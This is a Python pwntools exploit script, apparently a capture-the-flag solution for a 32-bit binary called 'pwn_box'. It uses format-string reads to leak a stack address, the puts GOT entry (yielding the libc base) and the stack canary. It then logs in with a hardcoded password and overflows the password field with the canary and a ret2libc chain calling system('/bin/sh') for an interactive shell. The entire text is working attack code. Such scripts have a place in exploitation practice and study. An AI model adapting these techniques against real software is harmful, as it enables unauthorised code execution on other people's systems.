from pwn import *
import time

r = process('./pwn_box')
e = ELF('./pwn_box')
p = 0x0804871b
pp = 0x0804871a
ppp = 0x08048f4d
leave = 0x08048638
self_read = 0x0804871D

def packAll(rop):
    return flat([p32(x) for x in rop])

# leak stack
r.sendlineafter('Who are you?\n', '%10$p')
stack = int(r.recvuntil('\n')[-11:-1], 16)
stack += 0x100
log.info('stack: 0x%x' % stack)

# leak libc
r.sendafter('Who are you?\n', '11'+p32(0x0804b030)+'%5$s') # puts got
r.recvuntil('\xb0\x04\x08')
puts = u32(r.recv(4))
log.info('puts address: 0x%x' % puts)
## we have libc now
libc = e.libc
libc_base = puts-libc.symbols['puts']
log.info('libc base: 0x%x' % libc_base)

# leak canary
r.sendlineafter('Who are you?\n', '%7$p')
canary = r.recvuntil('\n')[-11:-1]
canary = p32(int(canary, 16))

# rop
r.sendafter('Who are you?\n', 'admin2017c')
r.sendlineafter('available commands.\n', 'add')
r.sendlineafter('APP/Site: ', '')
r.sendlineafter('Username: ', '')
raw_input('>>')

system = libc.symbols['system'] + libc_base
bin_sh = next(libc.search('/bin/sh\x00')) + libc_base
rop = []
rop += [system, 0, bin_sh]
r.sendlineafter('Password: ', 'A'*0x1e+canary+'A'*0xc+packAll(rop))
r.interactive()

